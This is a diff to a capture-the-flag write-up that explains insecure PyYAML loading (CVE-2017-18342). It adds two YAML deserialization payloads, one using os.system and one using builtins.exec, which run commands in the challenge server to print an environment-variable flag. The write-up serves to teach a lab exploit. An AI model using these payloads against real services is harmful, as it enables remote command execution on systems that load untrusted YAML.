@@ -20,7 +20,7 @@ def genToken(seed:str) -> str:
 curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
 ````
 
-<p align="justify">Once token is validated yaml firware is loaded thanks to following lines. This load method is officialy deprecated for security reason. Instead </p> 
+<p align="justify">Once token is validated yaml firware is loaded thanks to following lines. This load method is officialy deprecated for security reasons and depicted as unsafe.</p> 
 
 ````python
     try:
@@ -31,7 +31,14 @@ curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
         pass
 ````
 
-## solve 1 
+## CVE-2017-18342
+<p align="justify"> This use of PyYaml load method is the subject of a CVE known as <a href="https://nvd.nist.gov/vuln/detail/cve-2017-18342">CVE-2017-18342</a>. This is actually a case of insecure YAML deserialization in which an attacker can leverage insecure YAML data load to use Python object constructors and as a result run commands in the environement of the challenge.</p>
+
+## Flag read
+<p align="justify">In this challenge, Flag is stored in FLAG venv and can be disclose easly using echo or cat.</p>
+
+### solve 1 
+<p align="justify">This first YAML payload return the flag in server output using os.system python object:</p>
 
 ````bash
 firmware:
@@ -40,7 +47,9 @@ firmware:
     echo $FLAG
 ````
 
-## solve 2  
+### solve 2  
+
+<p align="justify">This second YAML payload return the flag in server output using builtins.exec python object and leveraging threading server behavior and error output:</p>
 
 ````bash
 firmware:
@@ -53,3 +62,5 @@ firmware:
         raise Exception(f"FLAG_LEAK: {flag}")
     threading.Thread(target=leak_flag).start() # starting thread in server context triggers error relfected in output server (see snippet below)
 ````
+
+
